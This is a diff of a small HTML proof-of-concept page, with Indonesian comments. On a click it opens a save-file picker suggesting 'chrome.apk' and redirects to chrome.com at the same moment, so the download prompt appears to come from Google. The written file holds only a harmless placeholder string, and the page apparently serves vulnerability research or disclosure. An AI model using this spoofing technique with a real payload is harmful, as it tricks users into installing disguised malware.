@@ -1,56 +1,45 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>PoC</title>
-<style>
-body {
-    margin: 0;
-    height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-family: Arial, sans-serif;
-}
-.cta {
-    text-align: center;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC</title>
 </head>
 <body>
 
-<div class="cta">
-    <h1>Download Chrome for Android</h1>
-    <p>Click anywhere to continue</p>
-</div>
+<h1>Click anywhere</h1>
 
 <script>
 document.addEventListener('click', async () => {
-    if (!('showSaveFilePicker' in window)) return;
+    // Delay kecil sebelum picker
+    setTimeout(async () => {
+        if ('showSaveFilePicker' in window) {
+            try {
+                const handle = await window.showSaveFilePicker({
+                    suggestedName: 'chrome.apk',
+                    types: [{
+                        description: 'Android Package (demo)',
+                        accept: {
+                            'application/octet-stream': ['.apk']
+                        }
+                    }]
+                });
 
-    try {
-        // Step 1: Trigger file picker
-        const fileHandle = await window.showSaveFilePicker({
-            suggestedName: 'chrome.apk',
-            types: [{
-                description: 'Android Package (demo)',
-                accept: { 'application/octet-stream': ['.apk'] }
-            }]
-        });
+                const writable = await handle.createWritable();
+                await writable.write('Hai aja');
+                await writable.close();
 
-        // Step 2: Tulis isi file (PoC: "Hai aja")
-        const writable = await fileHandle.createWritable();
-        await writable.write('Hai aja');
-        await writable.close();
+            } catch (err) {
+                // cancel / abort expected
+            }
+        }
+    }, 1000);
 
-        // Step 3: Navigasi setelah picker muncul
-        setTimeout(() => {
-            window.location.href = 'https://www.google.com/chrome/';
-        }, 250);
+    // Redirect paralel
+    setTimeout(() => {
+        window.location.href = 'https://chrome.com';
+    }, 1000);
 
-    } catch (e) {
-        console.error('User cancelled or error:', e);
-    }
 }, { once: true });
 </script>
 
